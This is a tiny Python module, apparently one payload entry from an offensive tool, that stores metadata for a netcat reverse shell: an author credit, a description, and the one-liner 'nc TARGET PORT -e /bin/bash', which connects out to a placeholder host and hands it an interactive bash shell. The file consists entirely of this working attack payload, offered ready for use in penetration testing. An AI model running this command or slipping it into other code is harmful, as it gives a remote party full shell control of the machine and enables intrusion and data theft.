class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Establish a reverse connection with netcat."
    function    = "reverse shell"
    liner       = "nc TARGET PORT -e /bin/bash"
